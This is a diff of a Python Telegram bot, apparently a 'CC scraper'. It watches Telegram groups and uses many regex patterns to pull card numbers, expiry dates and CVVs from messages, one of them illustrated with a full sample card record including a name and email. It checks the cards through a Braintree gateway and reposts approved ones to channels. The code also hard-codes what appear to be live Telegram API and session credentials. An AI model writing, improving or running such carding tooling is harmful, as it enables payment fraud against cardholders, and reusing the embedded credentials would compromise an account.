@@ -1,10 +1,8 @@
 import re  
 import asyncio  
 import logging  
-import socket  
 from telethon import TelegramClient, events  
 from telethon.sessions import StringSession  
-from telethon.errors import AuthKeyDuplicatedError  
 from cc_checker import check_cc  
 
 # Configure logging
@@ -13,7 +11,7 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 # API Configuration  
 api_id = 25031007  # Replace with your actual API ID
 api_hash = "68029e5e2d9c4dd11f600e1692c3acaa"  # Replace with your actual API hash
-session_string = "1BVtsOHkBuwteo891QQt3wAC5SA4vCJcYzdXXHES6QtyRuGGgEzsxyJdzYzD573DvrPi0Z3qqTR5AJWGOZhcKHAV56VZ8MEYw-BADl48k_kCFOZusv2stf1hJPRZQ8G8fxLiWxwnWz_WjgHSLvYxtMmqrUUqXusu1xcZO6BmRoHVMth3xXfdqvXtbEgP6DIQ0fIVLQdFxj3EcE-Q8cuHTb6peDQ9QkV04DME8U51YeEw0AH5156nifS6sKvQLkLmncxyC3jkrY90tKCmyOyieXvDO9UAW-nLOSEg_RbJF0wqduCuzNpl1_kJ8azZlHt2pfpKj140t1VMHE0-HIPxl8Dnc0U1lACQ="  # Replace with your new Telethon session string
+session_string = "1BVtsOHkBuwteo891QQt3wAC5SA4vCJcYzdXXHES6QtyRuGGgEzsxyJdzYzD573DvrPi0Z3qqTR5AJWGOZhcKHAV56VZ8MEYw-BADl48k_kCFOZusv2stf1hJPRZQ8G8fxLiWxwnWz_WjgHSLvYxtMmqrUUqXusu1xcZO6BmRoHVMth3xXfdqvXtbEgP6DIQ0fIVLQdFxj3EcE-Q8cuHTb6peDQ9QkV04DME8U51YeEw0AH5156nifS6sKvQLkLmncxyC3jkrY90tKCmyOyieXvDO9UAW-nLOSEg_RbJF0wqduCuzNpl1_kJ8azZlHt2pfpKj140t1VMHE0-HIPxl8Dnc0U1lACQ="  # Replace with your actual Telethon session string
 
 # Sources Configuration - add as many as needed
 source_groups = [-1002410570317, -1001878543352, -1002540516113, -1002174077087]  # Add source group IDs if needed
@@ -82,13 +80,12 @@ cc_patterns = [
 
     # Format 8: 4019240106255832|03/26|987|小関美華|Doan|コセキ ミカ|k.mika.0801@icloud.com|0
     r'(\d{13,16})\|(\d{2})/(\d{2,4})\|(\d{3,4})(?:\|.*)?',
-
-    # Existing patterns for broader coverage
     r'(\d{13,16})[\s|/|\-|~]?\s*(\d{1,2})[\s|/|\-|~]?\s*(\d{2,4})[\s|/|\-|~]?\s*(\d{3,4})',
     r'(\d{13,16})\s(\d{1,2})\s(\d{2,4})\s(\d{3,4})',
     r'(\d{13,16})\n(\d{1,2})\n(\d{2,4})\n(\d{3,4})',
     r'(\d{13,16})\n(\d{1,2})[/|-](\d{2,4})\n(\d{3,4})',
     r'(\d{13,16})[:|=|>]?(\d{1,2})[:|=|>]?(\d{2,4})[:|=|>]?(\d{3,4})',
+    r'(\d{13,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
     r'cc(?:num)?:[\s]?(\d{13,16})[\s\n]+(?:exp|expiry|expiration):[\s]?(\d{1,2})[/|-](\d{2,4})[\s\n]+(?:cvv|cvc|cv2):[\s]?(\d{3,4})',
     r'(?:cc|card)(?:num)?[\s:]+(\d{13,16})[\s\n]+(?:exp|expiry|expiration)[\s:]+(\d{1,2})[/|-](\d{2,4})[\s\n]+(?:cvv|cvc|cv2)[\s:]+(\d{3,4})',
     r'(\d{13,16})(?:\s*(?:card|exp|expiry|expiration)\s*(?:date)?\s*[:|=|-|>])?\s*(\d{1,2})(?:\s*[/|-])?\s*(\d{2,4})(?:\s*(?:cvv|cvc|cv2)\s*[:|=|-|>])?\s*(\d{3,4})',
@@ -104,17 +101,10 @@ def format_cc(match):
     groups = match.groups()
     
     if len(groups) == 4:
-        # Handle patterns where month and year are separate or combined
-        if '/' in groups[1]:  # For patterns like mm/yy (e.g., 03/26)
-            cc, month_year, cvv = groups[0], groups[1], groups[3]
-            mm, yy = month_year.split('/')
-        elif '/' in groups[2]:  # For patterns like CCNUM: CVV: EXP: mm/yy
-            cc, cvv, mm, yy = groups[0], groups[1], groups[2], groups[3]
-        else:  # For patterns like mm|yy
-            if len(groups[2]) >= 3 and len(groups[2]) <= 4 and len(groups[3]) == 2:
-                cc, cvv, mm, yy = groups
-            else:
-                cc, mm, yy, cvv = groups
+        if len(groups[2]) >= 3 and len(groups[2]) <= 4 and len(groups[3]) == 2:
+            cc, cvv, mm, yy = groups
+        else:
+            cc, mm, yy, cvv = groups
     else:
         return None
     
@@ -144,16 +134,13 @@ def get_sources():
 async def cc_scraper(event):  
     text = event.raw_text  
     found_ccs = set()  
-    
-    # Log the raw message for debugging
-    logging.info(f"Raw message text: {text}")
-    
+  
     for pattern in cc_patterns:  
-        for match in re.finditer(pattern, text, re.MULTILINE | re.DOTALL):  
+        for match in re.finditer(pattern, text):  
             formatted_cc = format_cc(match)
             if formatted_cc:  
                 found_ccs.add(formatted_cc)
-    
+  
     if found_ccs:  
         for cc in found_ccs:  
             async with check_lock:  # Ensure only one check at a time
@@ -171,7 +158,7 @@ async def cc_scraper(event):
                                f"[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Braintree Auth\n"
                                f"[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» Approved ✅\n\n"
                                f"[ϟ]𝗜𝗻𝗳𝗼 -» {card_info}\n"
-                               f"[ϟ]�_I𝘀𝘀𝘂𝗲𝗿 -» {issuer} 🏛\n"
+                               f"[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {issuer} 🏛\n"
                                f"[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country_display}\n\n"
                                f"[⌬]𝗧𝗶𝗺𝗲 -» {result['time_taken']:.2f} seconds\n"
                                f"[⌬]𝗣𝗿𝗼𝘅𝘆 -» {result['proxy_status']}\n"
@@ -194,32 +181,24 @@ async def cc_scraper(event):
                 logging.info("Waiting 10 seconds before next check...")
                 await asyncio.sleep(10)
             logging.info("Lock released, proceeding to next check if any.")
-    else:
-        logging.info("No credit cards found in the message.")
 
 # Run Client  
 async def main():  
-    try:
-        await client.start()  
-        logging.info("✅ CC Scraper Running...")
-        logging.info(f"Server IP: {socket.gethostbyname(socket.gethostname())}")
+    await client.start()  
+    logging.info("✅ CC Scraper Running...")
+    
+    sources = get_sources()
+    if sources:
+        logging.info(f"✅ Monitoring {len(sources)} source(s)")
+    else:
+        logging.info("⚠️ No sources specified. Will monitor all chats the account has access to.")
+    
+    if target_channels:
+        logging.info(f"✅ Found CCs will be sent to {len(target_channels)} channel(s)")
+    else:
+        logging.info("⚠️ No target channels specified. Found CCs will be printed to console only.")
         
-        sources = get_sources()
-        if sources:
-            logging.info(f"✅ Monitoring {len(sources)} source(s)")
-        else:
-            logging.info("⚠️ No sources specified. Will monitor all chats the account has access to.")
-        
-        if target_channels:
-            logging.info(f"✅ Found CCs will be sent to {len(target_channels)} channel(s)")
-        else:
-            logging.info("⚠️ No target channels specified. Found CCs will be printed to console only.")
-            
-        await client.run_until_disconnected()  
-    except AuthKeyDuplicatedError as e:
-        logging.error(f"AuthKeyDuplicatedError: {e}")
-        logging.error("The session was used from multiple IPs simultaneously. Please generate a new session string and ensure exclusive usage.")
-        raise  # Re-raise to stop the script, or handle as needed
+    await client.run_until_disconnected()  
 
 if __name__ == "__main__":  
     asyncio.run(main())
